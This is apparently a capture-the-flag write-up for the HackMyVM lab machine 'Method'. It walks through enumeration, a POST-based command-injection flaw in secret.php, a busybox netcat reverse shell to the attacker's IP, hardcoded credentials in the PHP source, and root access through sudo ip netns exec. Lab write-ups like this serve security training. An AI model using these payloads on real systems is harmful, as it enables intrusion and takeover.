# Method

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Method | avijneyam | Beginner | HackMyVM |

**Summary:** Method is a beginner-level Linux virtual machine that demonstrates the importance of understanding HTTP request methods and proper enumeration techniques. The attack path begins with network discovery and port scanning, revealing an nginx web server running on port 80. Through careful web enumeration, hidden endpoints are discovered in the HTML source code, including a secret PHP script that accepts parameters. The key vulnerability lies in a POST-based Remote Code Execution (RCE) flaw in `/secret.php`, which when exploited with the correct HTTP method, allows arbitrary command execution as the www-data user. Credentials for the user `prakasaka` are found hardcoded in the vulnerable PHP source code. Privilege escalation to root is achieved by exploiting sudo permissions on the `/bin/ip` command, which allows spawning a root shell through network namespace manipulation. This machine emphasizes the criticality of HTTP method testing, source code analysis, and understanding Linux privilege escalation vectors through GTFOBins techniques.

---

## Reconnaissance

### Network Discovery

The initial step involves discovering active hosts on the local network. Using a PowerShell network scanning script, the target virtual machine is identified:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.98 08:00:27:65:50:38 VirtualBox
```

The scan identifies the target machine at `192.168.100.98` with a VirtualBox MAC address (`08:00:27:65:50:38`), confirming it as a virtualized environment.

### Port Scanning and Service Enumeration

A comprehensive Nmap scan is performed to identify open ports and running services:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/method]
└─$ nmap -sC -sV -p- -T4 192.168.100.98
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-10 09:28 WIB
Nmap scan report for 192.168.100.98
Host is up (0.0053s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|   3072 4b:24:34:1f:41:10:88:b7:5a:6a:63:d9:f6:75:26:6f (RSA)
|   256 52:46:e7:20:68:c1:6f:90:2f:a6:ad:ee:6d:87:e7:28 (ECDSA)
|_  256 3f:ce:97:a9:1e:f4:60:f4:0e:71:e7:46:58:28:71:f0 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Test Page for the Nginx HTTP Server on Fedora
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.78 seconds
```

**Key Findings:**
- **Port 22 (SSH):** OpenSSH 8.4p1 Debian 5 - Standard SSH service with no immediate vulnerabilities
- **Port 80 (HTTP):** nginx 1.18.0 - Web server running on Debian/Fedora with default test page
- **Operating System:** Linux kernel detected

The nginx server title "Test Page for the Nginx HTTP Server on Fedora" suggests a default installation, which may indicate minimal configuration and potential misconfigurations.

### Web Application Analysis

Accessing the web server at `http://192.168.100.98` via browser reveals the default nginx welcome page:

![](image.png)

The page displays the standard nginx welcome message with information about the default `index.html` page location (`/var/www/html`) and nginx configuration file path (`/etc/nginx/nginx.conf`). This confirms the server is running nginx on a Debian-based system.

Initial source code inspection reveals nothing immediately suspicious, necessitating deeper enumeration.

---

## Web Enumeration

### Directory and File Discovery

To uncover hidden files and directories, feroxbuster is used with the common wordlist from SecLists:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/method]
└─$ feroxbuster -u http://192.168.100.98/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.100.98/
 🚩  In-Scope Url          │ 192.168.100.98
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      116l      281w     3690c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET    11738l    65910w  3639918c http://192.168.100.98/office.gif
200      GET    24285l   143749w  4194304c http://192.168.100.98/hacker.gif (truncated to size limit)
302      GET        0l        0w        0c http://192.168.100.98/secret.php => https://images-na.ssl-images-amazon.com/images/I/31YDo0l4ZrL._SX331_BO1,204,203,200_.jpg
200      GET        7l       27w      344c http://192.168.100.98/index.htm
200      GET        9l       12w      285c http://192.168.100.98/sitemap.xml
[####################] - 72s    33260/33260   0s      found:5       errors:35
[####################] - 44s     4751/4751    108/s   http://192.168.100.98/
[####################] - 54s     4751/4751    89/s    http://192.168.100.98/.git/logs/
[####################] - 48s     4751/4751    99/s    http://192.168.100.98/cgi-bin/
[####################] - 65s     4751/4751    73/s    http://192.168.100.98/cgi-bin/.git/logs/
[####################] - 61s     4751/4751    78/s    http://192.168.100.98/cgi-bin/cgi-bin/
[####################] - 60s     4751/4751    79/s    http://192.168.100.98/.git/logs/cgi-bin/
[####################] - 49s     4751/4751    98/s    http://192.168.100.98/cgi-bin/cgi-bin/cgi-bin/
```

**Critical Discoveries:**
- **office.gif** - Large image file (3.6 MB)
- **hacker.gif** - Large image file (4.1 MB, truncated)
- **secret.php** - Returns HTTP 302 redirect to an Amazon image URL
- **index.htm** - Alternative index page (344 bytes)
- **sitemap.xml** - XML sitemap file (285 bytes)

The presence of `secret.php` with a redirect behavior and the alternative `index.htm` file are particularly interesting. The redirect pattern suggests defensive behavior against simple GET requests.

### Analyzing the Sitemap

Examining the sitemap.xml file reveals potential hints:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/method/target_code]
└─$ curl http://192.168.100.98/sitemap.xml
<?xml version="1.0" encoding="UTF-8"?>
<urlset xmlns="https://hackmyvm/sitemap/0.9">
   <url>
      <loc>https://hackmyvm.eu/machines/index.htm?vm=Brain</loc>
      <lastmod>2020-02-13</lastmod>
      <changefreq>monthly</changefreq>
      <priority>0.8</priority>
   </url>
</urlset>
```

The sitemap references `index.htm` with a query parameter `vm=Brain`. While "Brain" VM doesn't exist on HackMyVM, the sitemap explicitly points to `index.htm`, providing a clear hint to investigate that file further.

### Source Code Analysis of index.htm

Retrieving the content of index.htm reveals hidden HTML elements:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/method/target_code]
└─$ curl http://192.168.100.98/index.htm
<h1>It's Hacking Time</h1>
<img src="hacker.gif" alt="Hacker" height="640" width="640">
<img hidden="true" src="office.gif" alt="hahahahaha" height="640" width="640">
<form action="/secret.php" hidden="true" method="GET">
     <input type="text" name="HackMyVM" value="" maxlength="100"><br>
     <input type="submit" value="Submit">
</form>
```

**Critical Findings:**
1. **Hidden Image:** An office.gif image with `hidden="true"` attribute
2. **Hidden Form:** A form pointing to `/secret.php` with:
   - **Action:** /secret.php
   - **Method:** GET (explicitly defined)
   - **Parameter:** HackMyVM (text input, max 100 characters)
   - **Visibility:** Hidden from normal browser rendering

This hidden form provides the first clue that `secret.php` accepts a parameter named `HackMyVM` via GET method.

---

## Initial Access

### Testing the Secret Endpoint

Attempting to access `secret.php` with the `HackMyVM` parameter using GET method:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/method/target_code]
└─$ curl "http://192.168.100.98/secret.php?HackMyVM=id"
Now the main part what it is loooooool<br>Try other method  
```

The response message "Try other method" is a direct hint that the GET method is not the correct approach. This is the core concept of the machine - understanding and testing different HTTP methods.

### Remote Code Execution via POST Method

Following the hint, testing with POST method by sending the parameter in the request body:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/method/target_code]
└─$ curl -X POST -d "HackMyVM=id" http://192.168.100.98/secret.php
You Found ME : - (<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>
```

**Success!** The server executes the `id` command and returns the output, confirming **Remote Code Execution (RCE)** as the `www-data` user.

**Vulnerability Analysis:**
- The application accepts POST requests with the `HackMyVM` parameter
- The parameter value is passed directly to the `system()` function without sanitization
- This allows arbitrary command execution on the target system

### Establishing Reverse Shell

Setting up a netcat listener on the attacking machine:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/method]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
```

Executing a reverse shell payload using busybox (commonly available on Linux systems):

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/method/target_code]
└─$ curl -X POST -d "HackMyVM=busybox nc 192.168.100.1 4444 -e /bin/bash" http://192.168.100.98/secret.php
```

**Connection established:**

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/method]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 55208
which python3
/usr/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@method:~/html$ ^Z
zsh: suspended  nc -nvlp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/method]
└─$ stty raw -echo; fg
[1]  + continued  nc -nvlp 4444

www-data@method:~/html$ export SHELL=/bin/bash
www-data@method:~/html$ export TERM=xterm
www-data@method:~/html$ stty rows 100 cols 200
www-data@method:~/html$ reset
```

The shell is successfully upgraded to a fully interactive TTY using Python's pty module and proper terminal settings.

---

## Lateral Movement

### User Enumeration

Identifying users with valid login shells:

```bash
www-data@method:~/html$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
prakasaka:x:1000:1000:prakasaka,,,:/home/prakasaka:/bin/bash
```

Two users have bash shells: `root` (UID 0) and `prakasaka` (UID 1000). The target is to escalate to `prakasaka` first, then to root.

### Home Directory Exploration

Investigating the prakasaka user's home directory:

```bash
www-data@method:~/html$ cd /home
www-data@method:/home$ ls -la
total 12
drwxr-xr-x  3 root      root      4096 Oct 23  2021 .
drwxr-xr-x 18 root      root      4096 Oct 23  2021 ..
drwxr-xr-x  2 prakasaka prakasaka 4096 Oct 23  2021 prakasaka
www-data@method:/home$ cd prakasaka/
www-data@method:/home/prakasaka$ ls -la
total 24
drwxr-xr-x 2 prakasaka prakasaka 4096 Oct 23  2021 .
drwxr-xr-x 3 root      root      4096 Oct 23  2021 ..
lrwxrwxrwx 1 root      root         9 Oct 23  2021 .bash_history -> /dev/null
-rw-r--r-- 1 prakasaka prakasaka  220 Oct 23  2021 .bash_logout
-rw-r--r-- 1 prakasaka prakasaka 3526 Oct 23  2021 .bashrc
-rw-r--r-- 1 prakasaka prakasaka  807 Oct 23  2021 .profile
-rw-r--r-- 1 root      root        33 Oct 23  2021 uSeR.txt
```

**Interesting Findings:**
- `.bash_history` is symlinked to `/dev/null` (history disabled)
- `uSeR.txt` flag file is owned by root but has world-readable permissions (unusual configuration)

### Credential Discovery

Examining the vulnerable PHP script for hardcoded credentials:

```bash
www-data@method:~/html$ cat secret.php
<?php
if(isset($_GET['HackMyVM'])){
        echo "Now the main part what it is loooooool";
        echo "<br>";
echo "Try other method";
        die;
}
if(isset($_POST['HackMyVM'])){
        echo "You Found ME : - (";
        echo "<pre>";
        $cmd = ($_POST['HackMyVM']);
        system($cmd);
        echo "</pre>";
        die;
}
else {
header("Location: https://images-na.ssl-images-amazon.com/images/I/31YDo0l4ZrL._SX331_BO1,204,203,200_.jpg");
}
$ok="prakasaka:th3[REDACTED]";
?>
```

**Critical Discovery:** Hardcoded credentials found at the end of the script:
- **Username:** prakasaka
- **Password:** th3[REDACTED]

This is a common security mistake - leaving credentials in source code, especially in web-accessible directories.

### User Escalation

Switching to the prakasaka user with the discovered credentials:

```bash
www-data@method:~/html$ su - prakasaka
Password:
prakasaka@method:~$ id
uid=1000(prakasaka) gid=1000(prakasaka) groups=1000(prakasaka),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth)
```

Successfully authenticated as prakasaka (UID 1000) with multiple group memberships including cdrom, audio, video, and network-related groups.

---

## Privilege Escalation

### Sudo Permissions Analysis

Checking sudo privileges for the prakasaka user:

```bash
prakasaka@method:~$ sudo -l
Matching Defaults entries for prakasaka on method:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User prakasaka may run the following commands on method:
    (!root) NOPASSWD: /bin/bash
    (root) /bin/ip
```

**Critical Findings:**

1. **`(!root) NOPASSWD: /bin/bash`**
   - Allows running `/bin/bash` as ANY user EXCEPT root
   - No password required (NOPASSWD)
   - This negation rule prevents direct bash-to-root escalation

2. **`(root) /bin/ip`**
   - Allows running `/bin/ip` as root
   - Requires the current user's password (which we have)
   - This becomes our privilege escalation vector

### GTFOBins Exploitation

Consulting GTFOBins (https://gtfobins.github.io/gtfobins/ip/) for the `/bin/ip` command reveals a privilege escalation technique:

![](image-1.png)

The GTFOBins page shows that the `ip` command can spawn an interactive system shell through the network namespace functionality. The specific technique involves:
1. Creating a new network namespace with `ip netns add`
2. Executing commands within that namespace using `ip netns exec`
3. Since the command runs with sudo privileges, the spawned shell inherits root privileges

### Root Shell Exploitation

Executing the GTFOBins technique:

```bash
prakasaka@method:~$ sudo /bin/ip netns add foo
[sudo] password for prakasaka: th3[REDACTED]
prakasaka@method:~$ sudo /bin/ip netns exec foo /bin/bash
root@method:/home/prakasaka# id
uid=0(root) gid=0(root) groups=0(root)
root@method:/home/prakasaka# hostname
method
root@method:/home/prakasaka# whoami
root
```

**Success!** Root shell obtained (UID 0, GID 0).

**Exploitation Breakdown:**
1. `sudo /bin/ip netns add foo` - Creates a new network namespace named "foo" with root privileges
2. `sudo /bin/ip netns exec foo /bin/bash` - Executes `/bin/bash` within the "foo" namespace context
3. The bash shell spawned inherits the root privileges from the sudo command
4. Full root access achieved

### Flag Capture

Retrieving both user and root flags:

```bash
root@method:/home/prakasaka# cat /root/rOot.txt /home/prakasaka/uSeR.txt
[REDACTED]f7F
[REDACTED]06F
```

Machine successfully rooted!

---

## Attack Chain Summary

1. **Reconnaissance**: Network scan identified target at 192.168.100.98 running SSH (22/tcp) and nginx web server (80/tcp) on Debian Linux. Service enumeration revealed nginx 1.18.0 with default test page.

2. **Vulnerability Discovery**: Web enumeration with feroxbuster discovered hidden endpoints including `secret.php`, `sitemap.xml`, and `index.htm`. Analysis of `index.htm` source code revealed a hidden HTML form pointing to `secret.php` with parameter `HackMyVM`. Testing GET method resulted in hint message "Try other method", leading to discovery of POST-based Remote Code Execution vulnerability.

3. **Exploitation**: Exploited RCE vulnerability in `/secret.php` by sending POST request with `HackMyVM` parameter containing system commands. Established reverse shell using busybox netcat to gain initial foothold as `www-data` user. Upgraded shell to fully interactive TTY for stable access.

4. **Internal Enumeration**: Discovered user `prakasaka` in `/etc/passwd`. Found hardcoded credentials (`prakasaka:th3[REDACTED]`) in the vulnerable `/var/www/html/secret.php` file. Used credentials to escalate from `www-data` to `prakasaka` user via `su` command.

5. **Privilege Escalation**: Executed `sudo -l` to identify sudo permissions: `(!root) NOPASSWD: /bin/bash` (allows bash as any user except root) and `(root) /bin/ip` (allows ip command as root). Consulted GTFOBins and exploited `/bin/ip` command using network namespace manipulation (`sudo ip netns add foo && sudo ip netns exec foo /bin/bash`) to spawn root shell. Captured both user flag and root flag.
